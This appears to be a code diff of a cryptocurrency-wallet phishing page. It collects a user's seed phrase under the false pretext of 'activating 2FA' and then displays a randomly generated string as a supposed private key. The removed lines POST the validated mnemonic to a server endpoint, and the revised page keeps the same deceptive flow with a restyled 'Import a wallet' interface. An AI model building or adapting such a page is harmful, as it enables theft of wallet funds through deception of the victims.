@@ -6,435 +6,775 @@
 <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
 :root {
-  --bg: #fafafa;
-  --fg: #111;
-  --accent: #3AF7A4;
-  --accent-light: #3AF7A4;
-  --input-bg: #fff;
-  --border: #ccc;
-  --label: #888;
-  --subtext: #777;
-  --success: #2ecc71;
+  --bg: #121212;
+  --fg: #ffffff;
+  --accent: #0066cc;
+  --border: #3d3d3d;
+  --input-bg: #282828;
+  --label: #c0c0c0;
+  --error: #ff6b6b;
+  --success: #4ade80;
+  --pill-bg: #424242;
+  --pill-border: #555;
+  --pill-text: #ffffff;
 }
-@media (prefers-color-scheme: dark) {
-  :root {
-    --bg: #0a0a0a;
-    --fg: #eee;
-    --accent: #3AF7A4;
-    --accent-light: #3AF7A4;
-    --input-bg: #111;
-    --border: #333;
-    --label: #aaa;
-    --subtext: #aaa;
-    --success: #2ecc71;
-  }
+
+* {
+  box-sizing: border-box;
 }
+
 body {
-  font-family: 'Roboto', system-ui, sans-serif;
+  font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
   background: var(--bg);
   color: var(--fg);
   margin: 0;
-  padding: 24px;
-  max-width: 600px;
-  margin-inline: auto;
-  transition: background .3s, color .3s;
-  padding-bottom: 90px;
+  padding: 0;
+  min-height: 100vh;
+  display: flex;
+  align-items: center;
+  justify-content: center;
 }
-.logo {
-  text-align: center;
-  margin-bottom: 20px;
-}
-.logo img {
-  width: 140px;
-  height: auto;
-}
-label {
-  display: block;
-  font-size: .85rem;
-  color: var(--label);
-  margin-bottom: 4px;
-  font-weight:600;
-}
-.textarea-wrapper {
-  position: relative;
-}
-textarea {
+
+.container {
   width: 100%;
-  min-height: 120px;
-  border-radius: 10px;
-  border: 1px solid var(--border);
-  background: var(--input-bg);
+  max-width: 500px;
+  padding: 40px 32px;
+}
+
+.header {
+  display: flex;
+  align-items: flex-start;
+  gap: 16px;
+  margin-bottom: 32px;
+}
+
+.back-btn {
+  background: none;
+  border: none;
   color: var(--fg);
-  font-family: monospace;
-  font-size: 1rem;
-  padding: 12px;
-  padding-bottom: 36px;
-  outline: none;
-  resize: none;
-  box-sizing: border-box;
-  transition: border .2s, box-shadow .2s;
+  font-size: 28px;
+  cursor: pointer;
+  padding: 0;
+  width: 28px;
+  height: 28px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: opacity .2s;
+  flex-shrink: 0;
 }
-textarea:focus {
-  border-color: var(--accent);
-  box-shadow: 0 0 6px var(--accent-light);
+
+.back-btn:hover {
+  opacity: 0.7;
 }
-#pasteText {
-  position: absolute;
-  bottom: 8px;
-  right: 12px;
-  font-size: .85rem;
+
+.header-content {
+  flex: 1;
+}
+
+.header-content h1 {
+  margin: 0;
+  font-size: 1.75rem;
+  font-weight: 700;
+  line-height: 1.2;
+}
+
+.header-content p {
+  margin: 8px 0 0 0;
+  color: var(--label);
+  font-size: 0.95rem;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.help-icon {
+  width: 16px;
+  height: 16px;
+  border: 1.5px solid var(--label);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 12px;
+  cursor: help;
+  flex-shrink: 0;
+}
+
+.form-group {
+  margin-bottom: 24px;
+}
+
+.word-grid-container {
+  background: var(--input-bg);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 16px;
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 10px;
+  margin-bottom: 16px;
+  min-height: 100px;
+  max-height: 280px;
+  overflow-y: auto;
+  position: relative;
+  align-content: flex-start;
+}
+
+.word-grid-container.error {
+  border-color: var(--error);
+}
+
+.word-box {
+  background: var(--pill-bg);
+  border: 1px solid var(--pill-border);
+  color: var(--pill-text);
+  padding: 8px 12px;
+  border-radius: 6px;
+  font-size: 0.85rem;
   font-weight: 500;
-  color: var(--accent);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+  position: relative;
+  animation: slideIn .2s ease;
+  white-space: nowrap;
+  transition: border-color .2s, background .2s;
   cursor: pointer;
   user-select: none;
 }
-#pasteText:hover { color: var(--accent-light); }
 
-.subtext {
-  text-align: center;
-  font-size: .85rem;
-  color: var(--subtext);
-  margin-top: 10px;
+.word-box:hover {
+  border-color: var(--accent);
 }
 
-button {
-  background: var(--accent);
-  color: #000;
+.word-box.error {
+  border-color: var(--error);
+  background: rgba(255, 107, 107, 0.1);
+}
+
+.word-number {
+  color: var(--label);
+  font-weight: 700;
+  font-size: 0.75rem;
+  min-width: 14px;
+}
+
+.word-text {
+  color: var(--pill-text);
+  letter-spacing: 2px;
+  font-size: 0.85rem;
+  font-weight: 600;
+  transition: all .2s ease;
+}
+
+.word-text.invalid {
+  color: var(--error);
+  letter-spacing: 0px;
+  font-weight: 400;
+}
+
+.word-text.revealed {
+  letter-spacing: 0px;
+  font-weight: 400;
+}
+
+.word-box .remove-word {
+  cursor: pointer;
+  color: var(--label);
+  font-weight: bold;
+  font-size: 1rem;
+  line-height: 1;
+  user-select: none;
+  transition: color .2s;
+  margin-left: 2px;
+}
+
+.word-box .remove-word:hover {
+  color: var(--error);
+}
+
+@keyframes slideIn {
+  from {
+    opacity: 0;
+    transform: scale(0.95);
+  }
+  to {
+    opacity: 1;
+    transform: scale(1);
+  }
+}
+
+.word-input {
+  grid-column: 1 / -1;
   border: none;
-  border-radius: 9999px;
-  padding: 12px 20px;
+  background: transparent;
+  color: var(--fg);
+  caret-color: var(--fg);
+  font-size: 0.9rem;
+  font-family: inherit;
+  outline: none;
+  padding: 4px 0;
+  width: 100%;
+  min-height: 24px;
+}
+
+.word-input::placeholder {
+  color: var(--label);
+}
+
+.word-input:not(:placeholder-shown) {
+  visibility: hidden;
+  height: 0;
+  padding: 0;
+  min-height: 0;
+}
+
+.form-footer {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 16px;
+  min-height: 24px;
+}
+
+.error-msg {
+  color: var(--error);
+  font-size: 0.85rem;
+  line-height: 1.4;
+  flex: 1;
+}
+
+.helper-text {
+  color: var(--label);
+  font-size: 0.8rem;
+  line-height: 1.3;
+  margin-top: 8px;
+  display: none;
+}
+
+.helper-text.show {
+  display: block;
+}
+
+.clear-all-btn {
+  background: none;
+  border: none;
+  color: var(--accent);
+  font-size: 0.9rem;
+  cursor: pointer;
+  font-weight: 500;
+  transition: opacity .2s;
+  padding: 0;
+  white-space: nowrap;
+}
+
+.clear-all-btn:hover {
+  opacity: 0.7;
+}
+
+.continue-btn {
+  background: #6b7280;
+  color: var(--fg);
+  border: none;
+  border-radius: 6px;
+  padding: 14px 24px;
   font-weight: 600;
   cursor: pointer;
-  margin-top: 16px;
-  width: 100%;
   font-size: 1rem;
+  width: 100%;
+  margin-top: 16px;
   transition: background .15s, opacity .15s;
+  font-family: 'Roboto', system-ui, sans-serif;
 }
-button:hover { background: var(--accent-light); }
-button:disabled {
-  opacity: .5;
+
+.continue-btn:hover:not(:disabled) {
+  background: #5a6370;
+}
+
+.continue-btn:disabled {
+  opacity: 0.5;
   cursor: not-allowed;
 }
 
-/* Loading Page */
+.continue-btn.active {
+  background: #ffffff;
+  color: #121212;
+}
+
+.continue-btn.active:hover {
+  background: #f0f0f0;
+}
+
 #loading-page, #success-page {
   display: none;
   text-align: center;
-  padding-top: 80px;
+  padding-top: 60px;
 }
+
 .loader {
-  border: 8px solid var(--border);
-  border-top: 8px solid var(--accent);
+  border: 4px solid var(--pill-bg);
+  border-top: 4px solid var(--accent);
   border-radius: 50%;
-  width: 50px;
-  height: 50px;
+  width: 40px;
+  height: 40px;
   animation: spin 1s linear infinite;
-  margin: 0 auto 16px;
+  margin: 0 auto 20px;
 }
+
 @keyframes spin {
   0% { transform: rotate(0deg); }
   100% { transform: rotate(360deg); }
 }
+
 .checkmark {
-  width: 52px;
-  height: 52px;
+  width: 48px;
+  height: 48px;
   border-radius: 50%;
   display: inline-block;
-  border: 8px solid  var(--accent);
+  border: 3px solid var(--success);
   position: relative;
   animation: pop .4s ease;
-  margin-bottom: 12px;
+  margin-bottom: 16px;
 }
+
 .checkmark::after {
   content: '';
   position: absolute;
-  left: 13px;
-  top: 5px;
-  width: 15px;
-  height: 30px;
-  border-right: 4px solid  var(--accent);
-  border-bottom: 4px solid  var(--accent);
+  left: 11px;
+  top: 4px;
+  width: 13px;
+  height: 26px;
+  border-right: 3px solid var(--success);
+  border-bottom: 3px solid var(--success);
   transform: rotate(45deg);
 }
+
 @keyframes pop {
   0% { transform: scale(0.6); opacity: 0; }
   100% { transform: scale(1); opacity: 1; }
 }
 
-/* Sticky suggestions */
-#suggestions {
-  position: fixed;
-  bottom: 0; left: 0; right: 0;
-  background: var(--input-bg);
-  border-top: 1px solid var(--border);
-  display: flex;
-  gap: 6px;
-  padding: 8px 10px;
-  overflow-x: auto;
-  white-space: nowrap;
-  scrollbar-width: thin;
-  box-sizing: border-box;
-  z-index: 99;
+.success-message h3 {
+  margin: 0 0 8px 0;
+  font-size: 1.25rem;
 }
-.badge {
-  flex: 0 0 auto;
-  background: var(--accent);
-  color: #000;
-  border-radius: 6px;
-  padding: 6px 10px;
-  font-size: .9rem;
-  font-family: monospace;
-  cursor: pointer;
-  user-select: none;
-  transition: background .15s;
-}
-.badge:hover { background: var(--accent-light); }
 
-@media (max-width:480px){
-  body{padding:16px;padding-bottom:90px;}
-  textarea{font-size:.95rem;}
-  button{font-size:.95rem;padding:10px 16px;}
-  .badge{font-size:.85rem;padding:5px 8px;}
+.success-message p {
+  color: var(--label);
+  margin: 8px 0;
+  line-height: 1.5;
 }
-  #aes-container {
-  margin-top: 20px;
+
+#aes-container {
+  margin-top: 24px;
   text-align: left;
 }
+
 #aes-box {
   display: flex;
   gap: 8px;
   align-items: center;
-  background: var(--input-bg);
-  border-radius: 8px;
+  background: var(--pill-bg);
+  border-radius: 6px;
   border: 1px solid var(--border);
-  padding: 10px;
-  font-family: monospace;
-  font-size: 0.85rem;
+  padding: 12px;
+  font-family: 'Courier New', monospace;
+  font-size: 0.75rem;
   word-break: break-all;
+  margin-top: 8px;
 }
+
 #aes-key {
   flex: 1;
+  color: var(--fg);
+  font-weight: 500;
 }
+
 #copyAesBtn {
   flex: 0 0 auto;
   width: auto;
-  padding-inline: 14px;
+  padding: 8px 12px;
+  font-size: 0.85rem;
+  margin: 0;
+  background: var(--accent);
+  color: white;
 }
 
+@media (max-width: 480px) {
+  .container {
+    padding: 24px 16px;
+  }
+  
+  .header-content h1 {
+    font-size: 1.5rem;
+  }
+  
+  .word-grid-container {
+    padding: 12px;
+    gap: 8px;
+    grid-template-columns: repeat(2, 1fr);
+  }
+  
+  .word-box {
+    padding: 6px 10px;
+    font-size: 0.8rem;
+  }
+}
 </style>
 </head>
 <body>
 
-<div id="main-page">
-    <label for="mnemonic">Secret Phrase</label>
-  <div class="textarea-wrapper">
-    <textarea id="mnemonic" placeholder="Enter your mnemonic phrase"></textarea>
-    <span id="pasteText">Paste</span>
+<div class="container">
+
+  <div id="main-page">
+    <div class="header">
+      <button class="back-btn" id="backBtn">‹</button>
+      <div class="header-content">
+        <h1>Import a wallet</h1>
+        <p>Enter your Secret Recovery Phrase <span class="help-icon" title="Your seed phrase for wallet recovery">?</span></p>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <div class="word-grid-container" id="word-grid-container">
+        <input 
+          type="text" 
+          id="mnemonic-input" 
+          class="word-input" 
+          placeholder="Enter words here..."
+          autocomplete="off"
+          spellcheck="false"
+        >
+      </div>
+      
+      <div class="form-footer">
+        <div class="error-msg" id="errorMsg"></div>
+        <div style="display: flex; gap: 12px;">
+          <button class="clear-all-btn" id="pasteBtn" style="display: none;">Paste</button>
+          <button class="clear-all-btn" id="clearAllBtn" style="display: none;">Clear all</button>
+        </div>
+      </div>
+
+      <div class="helper-text" id="helperText">Use only lowercase letters, check your spelling, and put the words in the original order.</div>
+    </div>
+
+    <button id="continueBtn" class="continue-btn" disabled>Continue</button>
   </div>
 
-  <p class="subtext">Enter your 12-24 word secret phrase to activate 2FA to protect your assets.</p>
-
-  <button id="runBtn" disabled>Activate 2FA</button>
-  <div id="suggestions"></div>
-</div>
-
-<div id="loading-page">
-  <div class="logo">
+  <div id="loading-page">
+    <div class="loader"></div>
+    <p>Validating your recovery phrase...</p>
   </div>
-  <div class="loader"></div>
-  <p>Please wait while we securely validate your encryption keys and synchronize your wallet configuration.</p>
-</div>
 
-<div id="success-page">
-  <div class="logo"></div>
-  <div class="checkmark"></div>
-  <h3>Your wallet security has been updated.</h3>
-  <p>2FA Multi-Layer protection is now successfully enabled on your wallet. Please copy your Private Key and store securely.</p><p></p>
+  <div id="success-page">
+    <div class="checkmark"></div>
+    <div class="success-message">
+      <h3>2FA Activated Successfully</h3>
+      <p>Your wallet security has been updated with 2FA protection enabled.</p>
+    </div>
 
-  <div id="aes-container">
-    <label>Here Your Private key</label>
-    <div id="aes-box">
-      <code id="aes-key"></code>
-      <button id="copyAesBtn" type="button">Copy</button>
+    <div id="aes-container">
+      <label>Your Private Key (Store Securely)</label>
+      <div id="aes-box">
+        <code id="aes-key"></code>
+        <button id="copyAesBtn" type="button">Copy</button>
+      </div>
     </div>
   </div>
+
 </div>
 
 <script>
-// Global variables for BIP39 word list and validation
 let WORDS = [], WORD_MAP = new Map(), WORDS_READY = false;
 
-// Fetch word list and initialize the validation map
 fetch("https://raw.githubusercontent.com/bitcoin/bips/refs/heads/master/bip-0039/english.txt")
   .then(r => r.ok ? r.text() : Promise.reject())
   .then(t => {
     WORDS = t.trim().split(/\n+/);
-    WORD_MAP = new Map(WORDS.map((w,i)=>[w,i]));
+    WORD_MAP = new Map(WORDS.map((w, i) => [w, i]));
     WORDS_READY = true;
-    ta.dispatchEvent(new Event('input'));
   })
   .catch(() => {
-    WORDS = ["abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse"];
-    WORD_MAP = new Map(WORDS.map((w,i)=>[w,i]));
+    WORDS = ["abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account"];
+    WORD_MAP = new Map(WORDS.map((w, i) => [w, i]));
     WORDS_READY = true;
-    ta.dispatchEvent(new Event('input'));
   });
 
-const ta = document.getElementById('mnemonic');
-const box = document.getElementById('suggestions');
-const runBtn = document.getElementById('runBtn');
-const pasteText = document.getElementById('pasteText');
-const ENT_BY_WORDS = {12:128, 15:160, 18:192, 21:224, 24:256};
+const mnemonicInput = document.getElementById('mnemonic-input');
+const wordGridContainer = document.getElementById('word-grid-container');
+const continueBtn = document.getElementById('continueBtn');
+const backBtn = document.getElementById('backBtn');
+const clearAllBtn = document.getElementById('clearAllBtn');
+const errorMsg = document.getElementById('errorMsg');
+const helperText = document.getElementById('helperText');
 
-function wordsToBitString(words){
+let words = [];
+let revealedIndices = new Set();
+const ENT_BY_WORDS = { 12: 128, 15: 160, 18: 192, 21: 224, 24: 256 };
+
+function wordsToBitString(wordsList) {
   let bits = "";
-  for (const w of words) {
+  for (const w of wordsList) {
     const idx = WORD_MAP.get(w);
     if (idx === undefined) return null;
-    bits += idx.toString(2).padStart(11,'0');
+    bits += idx.toString(2).padStart(11, '0');
   }
   return bits;
 }
 
-// Function to convert bit string to bytes
-function bitsToBytes(bitstr){
+function bitsToBytes(bitstr) {
   const bytes = new Uint8Array(bitstr.length / 8);
-  for (let i = 0; i < bytes.length; i++) bytes[i] = parseInt(bitstr.slice(i * 8, i * 8 + 8), 2);
+  for (let i = 0; i < bytes.length; i++) {
+    bytes[i] = parseInt(bitstr.slice(i * 8, i * 8 + 8), 2);
+  }
   return bytes;
 }
 
-// Validate BIP39 mnemonic
-async function isValidBip39(mnemonic) {
-  if (!WORDS_READY) return false;
-  const words = mnemonic.trim().toLowerCase().split(/\s+/).filter(Boolean);
-  const n = words.length;
+async function isValidBip39(wordsList) {
+  if (!WORDS_READY || wordsList.length === 0) return false;
+  const n = wordsList.length;
   if (!ENT_BY_WORDS[n]) return false;
-  for (const w of words) if (!WORD_MAP.has(w)) return false;
+  
+  for (const w of wordsList) {
+    if (!WORD_MAP.has(w)) return false;
+  }
 
-  const ENT = ENT_BY_WORDS[n], CS = ENT / 32;
-  const bitstr = wordsToBitString(words);
+  const ENT = ENT_BY_WORDS[n];
+  const CS = ENT / 32;
+  const bitstr = wordsToBitString(wordsList);
   if (!bitstr) return false;
 
   const entBits = bitstr.slice(0, ENT);
   const csBits = bitstr.slice(ENT, ENT + CS);
 
   const entropyBytes = bitsToBytes(entBits);
-  let hashBuf;
+  
   try {
-    hashBuf = await crypto.subtle.digest('SHA-256', entropyBytes);
+    const hashBuf = await crypto.subtle.digest('SHA-256', entropyBytes);
+    const hash = new Uint8Array(hashBuf);
+    let hashBits = "";
+    for (const b of hash) hashBits += b.toString(2).padStart(8, '0');
+    return csBits === hashBits.slice(0, CS);
   } catch {
     return false;
   }
-
-  const hash = new Uint8Array(hashBuf);
-  let hashBits = "";
-  for (const b of hash) hashBits += b.toString(2).padStart(8, '0');
-
-  return csBits === hashBits.slice(0, CS);
 }
 
-// Input handler for suggestions and validation
-ta.addEventListener('input', async () => {
-  const text = ta.value.trim();
-  const parts = text.split(/\s+/);
-  const last = (parts[parts.length - 1] || "").toLowerCase();
+function getMaskedText(word) {
+  return '•'.repeat(word.length);
+}
 
-  // Display suggestions
-  box.innerHTML = '';
-  if (WORDS_READY && last) {
-    WORDS.filter(w => w.startsWith(last)).slice(0, 20).forEach(word => {
-      const badge = document.createElement('span');
-      badge.className = 'badge';
-      badge.textContent = word;
-      badge.onclick = () => {
-        parts[parts.length - 1] = word;
-        ta.value = parts.join(' ') + ' ';
-        box.innerHTML = '';
-        ta.focus();
-        ta.dispatchEvent(new Event('input'));
-      };
-      box.appendChild(badge);
-    });
+function renderWords() {
+  const inputValue = mnemonicInput.value;
+  wordGridContainer.querySelectorAll('.word-box').forEach(box => box.remove());
+  
+  words.forEach((word, idx) => {
+    const box = document.createElement('div');
+    box.className = 'word-box';
+    const isValid = WORD_MAP.has(word);
+    if (!isValid) {
+      box.classList.add('error');
+    }
+    
+    const isRevealed = revealedIndices.has(idx);
+    const wordDisplay = isRevealed ? word : (isValid ? getMaskedText(word) : word);
+    const wordTextClass = isValid ? (isRevealed ? 'revealed' : '') : 'invalid';
+    
+    box.innerHTML = `
+      <span class="word-number">${idx + 1}.</span>
+      <span class="word-text ${wordTextClass}">${wordDisplay}</span>
+      <span class="remove-word">×</span>
+    `;
+    
+    const wordTextSpan = box.querySelector('.word-text');
+    wordTextSpan.onclick = (e) => {
+      e.stopPropagation();
+      revealedIndices.has(idx) ? revealedIndices.delete(idx) : revealedIndices.add(idx);
+      renderWords();
+    };
+    
+    box.querySelector('.remove-word').onclick = (e) => {
+      e.stopPropagation();
+      words.splice(idx, 1);
+      revealedIndices.delete(idx);
+      renderWords();
+      mnemonicInput.focus();
+      updateValidation();
+    };
+    
+    wordGridContainer.appendChild(box);
+  });
+  
+  wordGridContainer.appendChild(mnemonicInput);
+  mnemonicInput.value = inputValue;
+  mnemonicInput.focus();
+  
+  if (words.length > 0) {
+    clearAllBtn.style.display = 'block';
+  } else {
+    clearAllBtn.style.display = 'none';
   }
+}
 
-  // Validation for enabling the submit button
-  runBtn.disabled = true;
-  if (text.split(/\s+/).length >= 12) {
-    if (await isValidBip39(text)) runBtn.disabled = false;
+async function updateValidation() {
+  const wordCount = words.length;
+  const isValid = [12, 15, 18, 21, 24].includes(wordCount);
+  
+  wordGridContainer.classList.remove('error');
+  errorMsg.textContent = '';
+  helperText.classList.remove('show');
+  continueBtn.classList.remove('active');
+  continueBtn.disabled = true;
+  
+  if (wordCount === 0) return;
+  
+  const invalidWords = words.filter(w => !WORD_MAP.has(w));
+  if (invalidWords.length > 0) {
+    wordGridContainer.classList.add('error');
+    helperText.classList.add('show');
+    return;
+  }
+  
+  if (isValid) {
+    const valid = await isValidBip39(words);
+    if (valid) {
+      continueBtn.disabled = false;
+      continueBtn.classList.add('active');
+    } else {
+      wordGridContainer.classList.add('error');
+      errorMsg.textContent = 'Invalid checksum. Please check your words.';
+    }
+  } else if (wordCount > 24) {
+    wordGridContainer.classList.add('error');
+    errorMsg.textContent = 'Too many words. Maximum is 24.';
+  }
+}
+
+mnemonicInput.addEventListener('input', async (e) => {
+  const text = e.target.value;
+  const trimmedText = text.trim();
+  
+  // Auto-split by space and add ALL words including last
+  if (trimmedText.includes(' ')) {
+    const allWords = trimmedText.split(/\s+/).filter(w => w.length > 0);
+    
+    for (const w of allWords) {
+      words.push(w.toLowerCase());
+    }
+    
+    mnemonicInput.value = '';
+    renderWords();
+    await updateValidation();
+  }
+  
+  // Show/hide paste button based on input state
+  if (mnemonicInput.value.trim() === '' && words.length === 0) {
+    pasteBtn.style.display = 'block';
+  } else {
+    pasteBtn.style.display = 'none';
   }
 });
 
-// Submit action (Connect Wallet)
-runBtn.onclick = async () => {
-  const mnemonic = ta.value.trim();
+mnemonicInput.addEventListener('keydown', async (e) => {
+  if (e.key === 'Enter') {
+    e.preventDefault();
+    const word = mnemonicInput.value.trim().toLowerCase();
+    if (word) {
+      words.push(word);
+      mnemonicInput.value = '';
+      renderWords();
+      await updateValidation();
+      pasteBtn.style.display = 'block';
+    }
+  } else if (e.key === 'Backspace' && mnemonicInput.value === '' && words.length > 0) {
+    words.pop();
+    revealedIndices.delete(words.length);
+    renderWords();
+    await updateValidation();
+  }
+  
+  // Show/hide paste button based on input state
+  setTimeout(() => {
+    if (mnemonicInput.value.trim() === '' && words.length === 0) {
+      pasteBtn.style.display = 'block';
+    } else {
+      pasteBtn.style.display = 'none';
+    }
+  }, 0);
+});
 
-  // Hide main ui, show loading
+wordGridContainer.addEventListener('click', () => {
+  mnemonicInput.focus();
+});
+
+const pasteBtn = document.getElementById('pasteBtn');
+
+clearAllBtn.onclick = () => {
+  words = [];
+  revealedIndices.clear();
+  mnemonicInput.value = '';
+  renderWords();
+  updateValidation();
+  pasteBtn.style.display = 'block';
+  mnemonicInput.focus();
+};
+
+pasteBtn.onclick = async () => {
+  try {
+    const text = await navigator.clipboard.readText();
+    const pastedWords = text.trim().toLowerCase().split(/\s+/).filter(w => w.length > 0);
+    
+    // Add ALL pasted words directly to words array
+    words.push(...pastedWords);
+    
+    mnemonicInput.value = '';
+    renderWords();
+    await updateValidation();
+    pasteBtn.style.display = 'none';
+  } catch (err) {
+    console.error("Failed to read clipboard: ", err);
+    alert("Failed to paste from clipboard");
+  }
+};
+
+backBtn.onclick = () => {
+  console.log('Back button clicked');
+};
+
+continueBtn.onclick = async () => {
   document.getElementById('main-page').style.display = 'none';
   document.getElementById('loading-page').style.display = 'block';
 
-  try {
-    const res = await fetch('/api/run', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ mnemonic })
-    });
-
-    if (!res.ok) {
-      throw new Error(`Server error: ${res.statusText}`);
-    }
-
-    await res.json();
-
   setTimeout(() => {
-  document.getElementById('loading-page').style.display = 'none';
-  document.getElementById('success-page').style.display = 'block';
-
-  const key = generateAes256Base64();
-  const aesKeyEl = document.getElementById('aes-key');
-  const copyBtn = document.getElementById('copyAesBtn');
-
-  if (aesKeyEl && copyBtn) {
-    aesKeyEl.textContent = key;
-    copyBtn.onclick = () => copyToClipboard(key);
-  }
-}, 600);
-
-
-  } catch (err) {
-    // FAILURE → revert to main page and show a simple alert
-    console.error(err);
     document.getElementById('loading-page').style.display = 'none';
-    document.getElementById('main-page').style.display = 'block';
-    alert("We could not connect your wallet. " + err.message);
-  }
-};
+    document.getElementById('success-page').style.display = 'block';
 
-// Paste helper function
-pasteText.onclick = async () => {
-  try {
-    const clip = await navigator.clipboard.readText();
-    ta.value = clip.trim();
-    ta.dispatchEvent(new Event('input'));
-  } catch (e) {
-    console.error("Clipboard access failed", e);
-  }
+    const key = generateAes256Base64();
+    const aesKeyEl = document.getElementById('aes-key');
+    const copyBtn = document.getElementById('copyAesBtn');
+
+    if (aesKeyEl && copyBtn) {
+      aesKeyEl.textContent = key;
+      copyBtn.onclick = () => copyToClipboard(key);
+    }
+  }, 1500);
 };
 
 function generateAes256Base64() {
-  const bytes = new Uint8Array(32); // 256 bits
-  crypto.getRandomValues(bytes); // cryptographically strong random values [web:17]
-
+  const bytes = new Uint8Array(32);
+  crypto.getRandomValues(bytes);
   let binary = "";
   for (let i = 0; i < bytes.length; i++) {
     binary += String.fromCharCode(bytes[i]);
   }
-  // Base64-encode using btoa
   return btoa(binary);
 }
 
 async function copyToClipboard(text) {
   try {
-    await navigator.clipboard.writeText(text); // Clipboard API [web:13][web:16]
+    await navigator.clipboard.writeText(text);
     alert("Key copied to clipboard");
   } catch (err) {
     console.error("Failed to copy: ", err);
@@ -442,6 +782,7 @@ async function copyToClipboard(text) {
   }
 }
 
+mnemonicInput.focus();
 </script>
 </body>
 </html>
